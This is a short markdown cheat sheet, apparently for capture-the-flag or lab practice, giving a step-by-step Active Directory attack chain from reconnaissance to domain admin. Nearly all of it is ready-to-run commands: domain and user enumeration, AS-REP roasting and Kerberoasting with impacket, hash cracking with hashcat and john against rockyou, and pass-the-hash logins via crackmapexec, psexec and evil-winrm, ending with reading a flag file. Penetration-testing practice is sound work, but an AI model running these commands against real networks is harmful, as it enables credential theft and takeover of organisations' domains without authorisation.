# 👑 RECON → DOMAIN ADMIN (Active Directory Chain)

---

## STEP 1: Enumerate Domain
```bash
enum4linux -a <DC_IP>
crackmapexec smb <DC_IP>
nmap --script smb-os-discovery -p 445 <DC_IP>
ldapsearch -x -H ldap://<DC_IP> -b "dc=domain,dc=local"
```

## STEP 2: User Enumeration
```bash
kerbrute userenum -d domain.local --dc <DC_IP> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
rpcclient -U "" -N <DC_IP> -c "enumdomusers"
crackmapexec smb <DC_IP> -u '' -p '' --users
```

## STEP 3: AS-REP Roasting (No pre-auth users)
```bash
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
# Hash milega → crack:
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hash.txt
```

## STEP 4: Kerberoasting (service account hashes)
```bash
impacket-GetUserSPNs domain.local/user:password -dc-ip <DC_IP> -request
# TGS hash crack:
hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
```

## STEP 5: Pass-the-Hash
```bash
crackmapexec smb <DC_IP> -u Administrator -H <NTLM_HASH>
impacket-psexec domain.local/Administrator@<DC_IP> -hashes :NTLM_HASH
evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>
```

## STEP 6: Domain Admin Confirmed
```bash
whoami
net user administrator /domain
type C:\Users\Administrator\Desktop\flag.txt
```

---

## QUICK DECISION:
```
AD environment
  ├─ Enumerate: enum4linux / crackmapexec / ldapsearch
  ├─ Users: kerbrute / rpcclient
  ├─ No pre-auth? → AS-REP Roast → crack hash
  ├─ Got creds? → Kerberoast → service account hashes
  ├─ Got hash? → Pass-the-Hash → psexec / evil-winrm
  └─ DA? → type flag.txt
```
